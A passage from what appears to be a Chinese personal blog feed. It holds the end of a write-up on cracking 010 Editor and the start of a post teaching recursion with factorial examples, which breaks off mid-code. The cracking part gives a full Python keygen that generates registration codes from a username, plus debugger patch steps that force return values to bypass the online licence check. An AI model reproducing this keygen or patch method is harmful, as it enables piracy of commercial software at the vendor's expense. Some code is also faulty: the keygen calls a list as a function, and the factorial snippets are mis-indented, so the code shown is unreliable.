class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>tables = [<span class="hljs-number">0x39cb44b8</span>, <span class="hljs-number">0x23754f67</span>, <span class="hljs-number">0x5f017211</span>, <span class="hljs-number">0x3ebb24da</span>, <span class="hljs-number">0x351707c6</span>, <span class="hljs-number">0x63f9774b</span>, <span class="hljs-number">0x17827288</span>, <span class="hljs-number">0x0fe74821</span>,<br>         <span class="hljs-number">0x5b5f670f</span>, <span class="hljs-number">0x48315ae8</span>, <span class="hljs-number">0x785b7769</span>, <span class="hljs-number">0x2b7a1547</span>, <span class="hljs-number">0x38d11292</span>, <span class="hljs-number">0x42a11b32</span>, <span class="hljs-number">0x35332244</span>, <span class="hljs-number">0x77437b60</span>,<br>         <span class="hljs-number">0x1eab3b10</span>, <span class="hljs-number">0x53810000</span>, <span class="hljs-number">0x1d0212ae</span>, <span class="hljs-number">0x6f0377a8</span>, <span class="hljs-number">0x43c03092</span>, <span class="hljs-number">0x2d3c0a8e</span>, <span class="hljs-number">0x62950cbf</span>, <span class="hljs-number">0x30f06ffa</span>,<br>         <span class="hljs-number">0x34f710e0</span>, <span class="hljs-number">0x28f417fb</span>, <span class="hljs-number">0x350d2f95</span>, <span class="hljs-number">0x5a361d5a</span>, <span class="hljs-number">0x15cc060b</span>, <span class="hljs-number">0x0afd13cc</span>, <span class="hljs-number">0x28603bcf</span>, <span class="hljs-number">0x3371066b</span>,<br>         <span class="hljs-number">0x30cd14e4</span>, <span class="hljs-number">0x175d3a67</span>, <span class="hljs-number">0x6dd66a13</span>, <span class="hljs-number">0x2d3409f9</span>, <span class="hljs-number">0x581e7b82</span>, <span class="hljs-number">0x76526b99</span>, <span class="hljs-number">0x5c8d5188</span>, <span class="hljs-number">0x2c857971</span>,<br>         <span class="hljs-number">0x15f51fc0</span>, <span class="hljs-number">0x68cc0d11</span>, <span class="hljs-number">0x49f55e5c</span>, <span class="hljs-number">0x275e4364</span>, <span class="hljs-number">0x2d1e0dbc</span>, <span class="hljs-number">0x4cee7ce3</span>, <span class="hljs-number">0x32555840</span>, <span class="hljs-number">0x112e2e08</span>,<br>         <span class="hljs-number">0x6978065a</span>, <span class="hljs-number">0x72921406</span>, <span class="hljs-number">0x314578e7</span>, <span class="hljs-number">0x175621b7</span>, <span class="hljs-number">0x40771dbf</span>, <span class="hljs-number">0x3fc238d6</span>, <span class="hljs-number">0x4a31128a</span>, <span class="hljs-number">0x2dad036e</span>,<br>         <span class="hljs-number">0x41a069d6</span>, <span class="hljs-number">0x25400192</span>, <span class="hljs-number">0x00dd4667</span>, <span class="hljs-number">0x6afc1f4f</span>, <span class="hljs-number">0x571040ce</span>, <span class="hljs-number">0x62fe66df</span>, <span class="hljs-number">0x41db4b3e</span>, <span class="hljs-number">0x3582231f</span>,<br>         <span class="hljs-number">0x55f6079a</span>, <span class="hljs-number">0x1ca70644</span>, <span class="hljs-number">0x1b1643d2</span>, <span class="hljs-number">0x3f7228c9</span>, <span class="hljs-number">0x5f141070</span>, <span class="hljs-number">0x3e1474ab</span>, <span class="hljs-number">0x444b256e</span>, <span class="hljs-number">0x537050d9</span>,<br>         <span class="hljs-number">0x0f42094b</span>, <span class="hljs-number">0x2fd820e6</span>, <span class="hljs-number">0x778b2e5e</span>, <span class="hljs-number">0x71176d02</span>, <span class="hljs-number">0x7fea7a69</span>, <span class="hljs-number">0x5bb54628</span>, <span class="hljs-number">0x19ba6c71</span>, <span class="hljs-number">0x39763a99</span>,<br>         <span class="hljs-number">0x178d54cd</span>, <span class="hljs-number">0x01246e88</span>, <span class="hljs-number">0x3313537e</span>, <span class="hljs-number">0x2b8e2d17</span>, <span class="hljs-number">0x2a3d10be</span>, <span class="hljs-number">0x59d10582</span>, <span class="hljs-number">0x37a163db</span>, <span class="hljs-number">0x30d6489a</span>,<br>         <span class="hljs-number">0x6a215c46</span>, <span class="hljs-number">0x0e1c7a76</span>, <span class="hljs-number">0x1fc760e7</span>, <span class="hljs-number">0x79b80c65</span>, <span class="hljs-number">0x27f459b4</span>, <span class="hljs-number">0x799a7326</span>, <span class="hljs-number">0x50ba1782</span>, <span class="hljs-number">0x2a116d5c</span>,<br>         <span class="hljs-number">0x63866e1b</span>, <span class="hljs-number">0x3f920e3c</span>, <span class="hljs-number">0x55023490</span>, <span class="hljs-number">0x55b56089</span>, <span class="hljs-number">0x2c391fd1</span>, <span class="hljs-number">0x2f8035c2</span>, <span class="hljs-number">0x64fd2b7a</span>, <span class="hljs-number">0x4ce8759a</span>,<br>         <span class="hljs-number">0x518504f0</span>, <span class="hljs-number">0x799501a8</span>, <span class="hljs-number">0x3f5b2cad</span>, <span class="hljs-number">0x38e60160</span>, <span class="hljs-number">0x637641d8</span>, <span class="hljs-number">0x33352a42</span>, <span class="hljs-number">0x51a22c19</span>, <span class="hljs-number">0x085c5851</span>,<br>         <span class="hljs-number">0x032917ab</span>, <span class="hljs-number">0x2b770ac7</span>, <span class="hljs-number">0x30ac77b3</span>, <span class="hljs-number">0x2bec1907</span>, <span class="hljs-number">0x035202d0</span>, <span class="hljs-number">0x0fa933d3</span>, <span class="hljs-number">0x61255df3</span>, <span class="hljs-number">0x22ad06bf</span>,<br>         <span class="hljs-number">0x58b86971</span>, <span class="hljs-number">0x5fca0de5</span>, <span class="hljs-number">0x700d6456</span>, <span class="hljs-number">0x56a973db</span>, <span class="hljs-number">0x5ab759fd</span>, <span class="hljs-number">0x330e0be2</span>, <span class="hljs-number">0x5b3c0ddd</span>, <span class="hljs-number">0x495d3c60</span>,<br>         <span class="hljs-number">0x53bd59a6</span>, <span class="hljs-number">0x4c5e6d91</span>, <span class="hljs-number">0x49d9318d</span>, <span class="hljs-number">0x103d5079</span>, <span class="hljs-number">0x61ce42e3</span>, <span class="hljs-number">0x7ed5121d</span>, <span class="hljs-number">0x14e160ed</span>, <span class="hljs-number">0x212d4ef2</span>,<br>         <span class="hljs-number">0x270133f0</span>, <span class="hljs-number">0x62435a96</span>, <span class="hljs-number">0x1fa75e8b</span>, <span class="hljs-number">0x6f092fbe</span>, <span class="hljs-number">0x4a000d49</span>, <span class="hljs-number">0x57ae1c70</span>, <span class="hljs-number">0x004e2477</span>, <span class="hljs-number">0x561e7e72</span>,<br>         <span class="hljs-number">0x468c0033</span>, <span class="hljs-number">0x5dcc2402</span>, <span class="hljs-number">0x78507ac6</span>, <span class="hljs-number">0x58af24c7</span>, <span class="hljs-number">0x0df62d34</span>, <span class="hljs-number">0x358a4708</span>, <span class="hljs-number">0x3cfb1e11</span>, <span class="hljs-number">0x2b71451c</span>,<br>         <span class="hljs-number">0x77a75295</span>, <span class="hljs-number">0x56890721</span>, <span class="hljs-number">0x0fef75f3</span>, <span class="hljs-number">0x120f24f1</span>, <span class="hljs-number">0x01990ae7</span>, <span class="hljs-number">0x339c4452</span>, <span class="hljs-number">0x27a15b8e</span>, <span class="hljs-number">0x0ba7276d</span>,<br>         <span class="hljs-number">0x60dc1b7b</span>, <span class="hljs-number">0x4f4b7f82</span>, <span class="hljs-number">0x67db7007</span>, <span class="hljs-number">0x4f4a57d9</span>, <span class="hljs-number">0x621252e8</span>, <span class="hljs-number">0x20532cfc</span>, <span class="hljs-number">0x6a390306</span>, <span class="hljs-number">0x18800423</span>,<br>         <span class="hljs-number">0x19f3778a</span>, <span class="hljs-number">0x462316f0</span>, <span class="hljs-number">0x56ae0937</span>, <span class="hljs-number">0x43c2675c</span>, <span class="hljs-number">0x65ca45fd</span>, <span class="hljs-number">0x0d604ff2</span>, <span class="hljs-number">0x0bfd22cb</span>, <span class="hljs-number">0x3afe643b</span>,<br>         <span class="hljs-number">0x3bf67fa6</span>, <span class="hljs-number">0x44623579</span>, <span class="hljs-number">0x184031f8</span>, <span class="hljs-number">0x32174f97</span>, <span class="hljs-number">0x4c6a092a</span>, <span class="hljs-number">0x5fb50261</span>, <span class="hljs-number">0x01650174</span>, <span class="hljs-number">0x33634af1</span>,<br>         <span class="hljs-number">0x712d18f4</span>, <span class="hljs-number">0x6e997169</span>, <span class="hljs-number">0x5dab7afe</span>, <span class="hljs-number">0x7c2b2ee8</span>, <span class="hljs-number">0x6edb75b4</span>, <span class="hljs-number">0x5f836fb6</span>, <span class="hljs-number">0x3c2a6dd6</span>, <span class="hljs-number">0x292d05c2</span>,<br>         <span class="hljs-number">0x052244db</span>, <span class="hljs-number">0x149a5f4f</span>, <span class="hljs-number">0x5d486540</span>, <span class="hljs-number">0x331d15ea</span>, <span class="hljs-number">0x4f456920</span>, <span class="hljs-number">0x483a699f</span>, <span class="hljs-number">0x3b450f05</span>, <span class="hljs-number">0x3b207c6c</span>,<br>         <span class="hljs-number">0x749d70fe</span>, <span class="hljs-number">0x417461f6</span>, <span class="hljs-number">0x62b031f1</span>, <span class="hljs-number">0x2750577b</span>, <span class="hljs-number">0x29131533</span>, <span class="hljs-number">0x588c3808</span>, <span class="hljs-number">0x1aef3456</span>, <span class="hljs-number">0x0f3c00ec</span>,<br>         <span class="hljs-number">0x7da74742</span>, <span class="hljs-number">0x4b797a6c</span>, <span class="hljs-number">0x5ebb3287</span>, <span class="hljs-number">0x786558b8</span>, <span class="hljs-number">0x00ed4ff2</span>, <span class="hljs-number">0x6269691e</span>, <span class="hljs-number">0x24a2255f</span>, <span class="hljs-number">0x62c11f7e</span>,<br>         <span class="hljs-number">0x2f8a7dcd</span>, <span class="hljs-number">0x643b17fe</span>, <span class="hljs-number">0x778318b8</span>, <span class="hljs-number">0x253b60fe</span>, <span class="hljs-number">0x34bb63a3</span>, <span class="hljs-number">0x5b03214f</span>, <span class="hljs-number">0x5f1571f4</span>, <span class="hljs-number">0x1a316e9f</span>,<br>         <span class="hljs-number">0x7acf2704</span>, <span class="hljs-number">0x28896838</span>, <span class="hljs-number">0x18614677</span>, <span class="hljs-number">0x1bf569eb</span>, <span class="hljs-number">0x0ba85ec9</span>, <span class="hljs-number">0x6aca6b46</span>, <span class="hljs-number">0x1e43422a</span>, <span class="hljs-number">0x514d5f0e</span>,<br>         <span class="hljs-number">0x413e018c</span>, <span class="hljs-number">0x307626e9</span>, <span class="hljs-number">0x01ed1dfa</span>, <span class="hljs-number">0x49f46f5a</span>, <span class="hljs-number">0x461b642b</span>, <span class="hljs-number">0x7d7007f2</span>, <span class="hljs-number">0x13652657</span>, <span class="hljs-number">0x6b160bc5</span>,<br>         <span class="hljs-number">0x65e04849</span>, <span class="hljs-number">0x1f526e1c</span>, <span class="hljs-number">0x5a0251b6</span>, <span class="hljs-number">0x2bd73f69</span>, <span class="hljs-number">0x2dbf7acd</span>, <span class="hljs-number">0x51e63e80</span>, <span class="hljs-number">0x5cf2670f</span>, <span class="hljs-number">0x21cd0a03</span>,<br>         <span class="hljs-number">0x5cff0261</span>, <span class="hljs-number">0x33ae061e</span>, <span class="hljs-number">0x3bb6345f</span>, <span class="hljs-number">0x5d814a75</span>, <span class="hljs-number">0x257b5df4</span>, <span class="hljs-number">0x0a5c2c5b</span>, <span class="hljs-number">0x16a45527</span>, <span class="hljs-number">0x16f23945</span><br>         ]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_quo</span>():</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">0x10000</span>)      <span class="hljs-comment"># 这个i，就是(0x100*(k[1]^k[7])+(k[2]^k[5])</span><br>        eax = (((i ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span> eax % <span class="hljs-number">11</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (eax / <span class="hljs-number">0xb</span> &lt;= <span class="hljs-number">0x3E8</span>):<br>            <span class="hljs-keyword">return</span> i, eax // <span class="hljs-number">0xb</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base_name_calc</span>(<span class="hljs-params">username, a2, a3, a4</span>):</span><br>    result = <span class="hljs-number">0</span><br>    username_len = <span class="hljs-built_in">len</span>(username)<br>    <span class="hljs-keyword">if</span> username_len &gt; <span class="hljs-number">0</span>:<br>        v7 = <span class="hljs-number">0</span><br>        v9 = (<span class="hljs-number">0xf</span> * a4) &amp; <span class="hljs-number">0xff</span><br>        v10 = (<span class="hljs-number">0x11</span> * a3) &amp; <span class="hljs-number">0xff</span><br>        v11 = <span class="hljs-number">0</span><br>        v12 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> v7 &lt; username_len:<br>            upper_char = <span class="hljs-built_in">ord</span>(username[v7].upper())  <span class="hljs-comment"># upper_char = v13</span><br>            v14 = (result + tables[upper_char]) &amp; <span class="hljs-number">0xffffffff</span>    <span class="hljs-comment"># 防止溢出</span><br>            <span class="hljs-keyword">if</span> a2:<br>                v15 = (tables[v9] + tables[v10] + tables[upper_char+<span class="hljs-number">0x2f</span>] * (v14 ^ tables[upper_char+<span class="hljs-number">0xd</span>])) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v11<br>            <span class="hljs-keyword">else</span>:       <span class="hljs-comment"># 其实这个可以忽略，因为a2始终为真</span><br>                v15 = (tables[v9] + tables[v10] + tables[upper_char + <span class="hljs-number">0x17</span>] * (v14 ^ tables(upper_char+<span class="hljs-number">0x3f</span>))) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v12<br>            result = tables[v16]+v15<br>            v7 = v7 + <span class="hljs-number">1</span><br>            v11 = (v11 + <span class="hljs-number">19</span>) % <span class="hljs-number">0x100</span><br>            v10 = (v10 + <span class="hljs-number">9</span>) % <span class="hljs-number">0x100</span><br>            v9 = (v9 + <span class="hljs-number">13</span>) % <span class="hljs-number">0x100</span><br>            v12 = (v12 + <span class="hljs-number">7</span>) % <span class="hljs-number">0x100</span><br>        <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> result<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input a username:&quot;</span>)<br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">8</span><br>    k[<span class="hljs-number">3</span>] = <span class="hljs-number">0x9c</span>     <span class="hljs-comment"># 0x9c版本注册码的算法</span><br>    v8,v9 = guess_quo()<br>    result = base_name_calc(name, <span class="hljs-literal">True</span>, <span class="hljs-number">0</span>, v9)<br>    k[<span class="hljs-number">4</span>] = result &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">5</span>] = (result &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">6</span>] = (result &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">7</span>] = (result &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">2</span>] = k[<span class="hljs-number">5</span>] ^ (v8 % <span class="hljs-number">0x100</span>)  <span class="hljs-comment"># 回顾一下上面取随机值i的时候</span><br>    k[<span class="hljs-number">1</span>] = k[<span class="hljs-number">7</span>] ^ (v8 &gt;&gt; <span class="hljs-number">8</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k[<span class="hljs-number">0</span>] = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">256</span>)<br>        v10 = (((k[<span class="hljs-number">6</span>] ^ k[<span class="hljs-number">0</span>]) ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">61</span>) % <span class="hljs-number">0x100</span>) ^ <span class="hljs-number">0xa7</span><br>        <span class="hljs-keyword">if</span> v10 &gt;= <span class="hljs-number">10</span>:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):  <span class="hljs-comment"># 使输出更完美</span><br>        <span class="hljs-keyword">if</span> k[i] &lt; <span class="hljs-number">16</span>:<br>            k[i] = <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>].upper()<br>        <span class="hljs-keyword">else</span>:<br>            k[i] = <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>].upper()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Password: %s%s-%s%s-%s%s-%s%s&#x27;</span> % (k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">4</span>], k[<span class="hljs-number">5</span>], k[<span class="hljs-number">6</span>], k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<span class="hljs-comment"># 入口</span><br>   main()<br></code></pre></td></tr></table></figure><h4 id="4-去除网络验证"><a href="#4-去除网络验证" class="headerlink" title="4.去除网络验证"></a>4.去除网络验证</h4><p>这块，如果不是看文章的话，我自己来指定不会写，作为菜鸡的我根本想不到好吧</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/42.png"></p><p>不过既然看到了大佬的操作，那就学一下，虽然平常捡垃圾用不到，但多学点总归不是错的。</p><p>这里由于虚拟机的网络有点小问题，导致虚拟机中一直不谈网络校验那个错误位置，哦！这么看我前面的所有分析过程全部在无网情况下进行，难度有所降低，就这还看了那么久，真是菜中菜。虚拟机不行，所以只能在物理机中进行操作。打开010Editor，xdbg进行挂载，将程序走到如下位置</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/43.png"></p><p>程序正常情况下这两个函数都要返回0x2D(别问，问就是拿个正确的注册码去虚拟机试一下)，这里程序返回0x113，是个问题，记录一下，程序继续往下走，走到一个jns，这里需要看一下</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/44.png"></p><p>OK，分析结束，继续往下走，看看是不是跟我们想的一样，果然预期一样，程序走到如下图位置错误信息就跳出来了，所以，那个jns不能跳，跳了就GG</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/45.png"></p><p>这里有过一次将跳转注释成nop尝试，程序在每次打开的时候都会跳出验证页面，所以这里直接看jns上面的那个函数。jns上面是个<code>test eax,eax</code>，只要eax的值不为0，jns就不会跳。</p><p>重新加载程序，进入<code>call 010editor.7FF611CA94AD</code>位置，开始单步，走了一圈发现没有找到能够直接控制eax值的位置，既然这样，那就直接在程序的最后，加个<code>mov eax,0x2</code>，因为要求的是大于0就可以了，所以只要是个大于0的数就行</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/46.png"></p><p>改完之后程序继续往下走，跳转满足，但是有个需要注意的地方就是，接下来还有比较<code>cmp ebx,0xDB</code>，要是ebx不为0xDB，则会报注册码错误。别问为啥知道的，走了很多遍，走的人都麻了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/47.png"></p><p>这里将0x113更改为0xDB，已经有经验了，直接进入该函数更改一下返回的位置就可以了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/48.png"></p><p>重新载入程序，然后跟着修改之后的程序走一下，发现能够成功走到注册码正确的位置，也没有网络验证</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/49.png"></p><p>最后就是修改补丁，保存修改的文件，再用修改后的文件替换掉源文件就算是彻底完工，当然不推荐替换源文件，可以换个文件名，然后更改一下快捷方式中的目标就OK。完工！</p><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h4><p>这篇文章，大部分的思路来源于参考链接中的三篇文章，在自己调试以及注册机的编写过程中，遇到了种种问题，也是一点点的解决，一点点的自己尝试，因为有学习到东西，故将此次学习过程记录下来，可以说抄袭，但这次的抄袭算是抄明白了。说白了，还是太菜了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/50.png"></p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2">https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2</a></p><p><a href="https://www.52pojie.cn/thread-1557588-1-1.html">https://www.52pojie.cn/thread-1557588-1-1.html</a></p><p><a href="https://blog.csdn.net/weixin_43272781/article/details/101173877">https://blog.csdn.net/weixin_43272781/article/details/101173877</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>被迫的记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>recursion递归算法</title>
    <link href="/2022/01/22/recursion/"/>
    <url>/2022/01/22/recursion/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>刷codewars的时候，碰到一个字符串的全排列，emmm，不会，然后就去寻找了一下解决方法，发现是用递归进行解决(可能有其他方法，但没发现，调用库函数的不算)。然后看了半天别人的思路发现始终有点迷糊，就重新学习了一下递归(我记着我以前会，emmm,可能也是会的不咋滴)。</p><h3 id="递归算法简述"><a href="#递归算法简述" class="headerlink" title="递归算法简述"></a>递归算法简述</h3><p>**递归算法 ** 是指一种通过重复将问题分解为同类的子问题而解决问题的方法，也是指在定义的函数中调用函数自身的方法。递归算法实际上分为两层意思，一个”递”，一个”归”，这也是在后续使用递归算法中的重要地方。</p><p>本文不会对递归的时间复杂度进行分析，因为不会，只是通过几个例子来学习一下如何使用递归算法。</p><p>**递归算法 ** 通常用来解决结构自相似的问题。所谓结构自相似，是指构成原问题的子问题与原问题在结构上相似，可以用类似的方法解决。而在使用递归时，则是通过将问题分解成相同类型的子问题，然后再通过子问题的结果再反推出问题的结果。</p><p><strong>递归算法</strong> 的三步：</p><ol><li>递归函数的参数以及返回值</li><li>确定终止条件</li><li>单层递归的逻辑</li></ol><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><h4 id="举例1：n的阶乘"><a href="#举例1：n的阶乘" class="headerlink" title="举例1：n的阶乘"></a>举例1：n的阶乘</h4><p>先对n的阶乘进行分析</p><p><code>n! = n * (n-1) * (n-2) * ······* 2 * 1</code>，相当于下式</p><p><img src="/2022/01/22/recursion/1.png" alt="img"></p><p>假设n=1，则n的阶乘等于1；n=2时，n的阶乘等于2*1=2</p><p>首先确定递归函数的参数以及返回值，既然是n的阶乘，那参数肯定毫无疑问是n(递归函数的参数，如果刚开始不能确定所有，则可以在后续进行补充，不影响的。)，再说返回值，求n的阶乘，返回值指定是阶乘的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#求n的阶乘</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>确定终止条件，已知<code>1!</code>== 1，则可以确定当n==1时，这个递归就可以终止了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>确定单层递归的逻辑，已知<code>n! = n * (n-1) * (n-2) * ······* 2 * 1</code>，使用f(n)来表示n的阶乘，<code>f(n)==n*f(n-1)</code>，当n-1等于1时，则可以直接返回已知的结果。则函数就可以写成如下形式:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>要是没理解，先假设n=2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*f(<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#已知f(1)==1，则相当于直接return 2*1</span><br></code></pre></td></tr></table></figure><p>再看n=3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">3</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>*f(<span class="hljs-number">3</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#return 3*f(2),调用f()，求f(2),也就再返回到上面的式子中</span><br></code></pre></td></tr></table></figure><p>再假设n=5，则函数具体的执行流程如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">f(<span class="hljs-number">5</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*f(<span class="hljs-number">4</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*f(<span class="hljs-number">3</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*f(<span class="hljs-number">2</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*(<span class="hljs-number">2</span>*f(<span class="hljs-number">1</span>))))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span 